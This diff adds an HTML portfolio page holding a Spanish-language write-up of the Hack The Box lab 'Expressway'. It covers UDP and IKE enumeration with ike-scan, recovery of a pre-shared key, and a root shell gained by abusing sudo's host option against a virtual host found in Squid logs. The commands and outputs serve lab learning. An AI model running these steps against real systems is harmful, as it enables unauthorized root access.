@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<!-- 📝 PLANTILLA — duplica este archivo, renómbralo y edita el contenido.
+     Luego añade una entrada en /portfolio/posts.js con la ruta del nuevo archivo. -->
+<title>Título del Write-up — Eduardo Juarez</title>
+<meta name="description" content="Resumen corto del write-up para SEO y previews." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../../static/styles/styles.css" />
+<link rel="stylesheet" href="../../static/styles/article.css" />
+</head>
+<body>
+<div class="grain"></div>
+
+<header class="nav">
+  <a href="../../index.html" class="logo"><span class="bracket">[</span>eduardo<span class="cursor">_</span><span class="bracket">]</span></a>
+  <nav>
+    <a href="../../index.html#posts">publicaciones</a>
+    <a href="../../index.html#contact">contacto</a>
+  </nav>
+</header>
+
+<main class="article">
+  <a class="back" href="../../index.html#posts">← volver a publicaciones</a>
+
+  <header class="meta">
+    <span class="kind">Write-up</span>
+    <h1>HTB — Expressway</h1>
+    <div class="sub">
+      <span>📅 14/06/2026</span>
+      <span class="dot-sep">·</span>
+      <span>⏱️ 2 min de lectura</span>
+      <span class="dot-sep">·</span>
+      <span>🎯 Dificultad: Easy</span>
+    </div>
+    <div class="tags-mini">
+      <span>HTB</span><span>Linux</span><span>UDP</span><span>ISAKMP</span><span>sudo abuse</span>
+    </div>
+  </header>
+
+<p>
+La máquina Expressway presenta un escenario centrado en VPN IPsec/IKE. El acceso inicial se obtiene
+mediante la enumeración del servicio ISAKMP expuesto por UDP y la recuperación de una clave PSK.
+Posteriormente, la escalada de privilegios aprovecha una configuración específica de sudo asociada a un host virtual.
+</p>
+
+<h2>Reconocimiento</h2>
+
+<p>El escaneo inicial con Nmap mostró únicamente SSH sobre TCP:</p>
+
+<pre><code>nmap expressway.htb -A
+
+22/tcp open ssh OpenSSH 10.0p2 Debian 8
+</code></pre>
+
+<p>Al no existir más servicios TCP relevantes, se realizó enumeración UDP:</p>
+
+<pre><code>nmap expressway.htb -sU --top-ports 100
+
+68/udp   open|filtered dhcpc
+69/udp   open|filtered tftp
+500/udp  open          isakmp
+4500/udp open|filtered nat-t-ike
+</code></pre>
+
+<p>
+El puerto 500/UDP indicaba la presencia de un servicio ISAKMP utilizado por IPsec/IKE para la negociación
+de túneles VPN seguros.
+</p>
+
+<h2>Enumeración de IKE/IPsec</h2>
+
+<p>Utilizando ike-scan se confirmó el servicio y sus parámetros criptográficos:</p>
+
+<pre><code>ike-scan -M expressway.htb
+
+SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
+VID=(XAUTH)
+</code></pre>
+
+<ul>
+<li>Autenticación mediante PSK (Pre-Shared Key).</li>
+<li>Cifrado 3DES.</li>
+<li>Hash SHA1.</li>
+<li>Diffie-Hellman Group 2 (1024 bits).</li>
+<li>Soporte para XAUTH.</li>
+</ul>
+
+<p>Posteriormente se lanzó una enumeración en modo agresivo:</p>
+
+<pre><code>ike-scan -P -M -A -n fakeID expressway.htb
+</code></pre>
+
+<p>La respuesta reveló el identificador:</p>
+
+<pre><code>ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+</code></pre>
+
+<div>
+<strong>Hallazgo:</strong> Se obtuvo el usuario <code>ike</code> junto con el material necesario para realizar cracking de la PSK.
+</div>
+
+<h2>Acceso inicial</h2>
+
+<p>
+Tras recuperar la clave PSK y completar la autenticación, fue posible establecer acceso al sistema mediante SSH
+como el usuario <code>ike</code>.
+</p>
+
+<h2>Enumeración local</h2>
+
+<p>Se revisaron los grupos del usuario:</p>
+
+<pre><code>id
+
+uid=1001(ike) gid=1001(ike)
+groups=1001(ike),13(proxy)
+</code></pre>
+
+<p>El grupo <code>proxy</code> permitía acceder a directorios relacionados con Squid:</p>
+
+<pre><code>find / -group proxy -type d 2>/dev/null
+
+/run/squid
+/var/spool/squid
+/var/log/squid
+</code></pre>
+
+<p>En los registros de acceso apareció un subdominio interesante:</p>
+
+<pre><code>cat access.log.1 | grep htb
+
+GET http://offramp.expressway.htb
+</code></pre>
+
+<p>
+Esto reveló la existencia del host virtual <code>offramp.expressway.htb</code>, pieza clave para la escalada.
+</p>
+
+<h2>Escalada de privilegios</h2>
+
+<p>
+Durante la enumeración se observó una versión reciente de sudo:
+</p>
+
+<pre><code>sudo -V
+
+Sudo version 1.9.17
+</code></pre>
+
+<p>
+Investigando configuraciones relacionadas con nombres de host se probó el parámetro <code>-h</code> apuntando
+al subdominio descubierto anteriormente:
+</p>
+
+<pre><code>sudo -h offramp.expressway.htb -l
+</code></pre>
+
+<p>La salida mostró permisos completos:</p>
+
+<pre><code>User ike may run the following commands on offramp:
+(root) NOPASSWD: ALL
+(root) NOPASSWD: ALL
+</code></pre>
+
+<div>
+<strong>Resultado:</strong> El usuario podía ejecutar cualquier comando como root sin contraseña cuando sudo evaluaba las reglas para el host <code>offramp.expressway.htb</code>.
+</div>
+
+<p>Finalmente:</p>
+
+<pre><code>sudo -h offramp.expressway.htb /bin/bash
+</code></pre>
+
+<p>Con ello se obtuvo una shell con privilegios de root.</p>
+
+<h2>Conclusión</h2>
+
+<p>
+La cadena de ataque combinó enumeración de IKE/IPsec, recuperación de una PSK, acceso como usuario válido
+y una configuración insegura de sudo basada en hostname. La clave del compromiso fue identificar el subdominio
+oculto en los logs de Squid y utilizarlo para activar privilegios administrativos completos.
+</p>
+
+</body>
+</html>
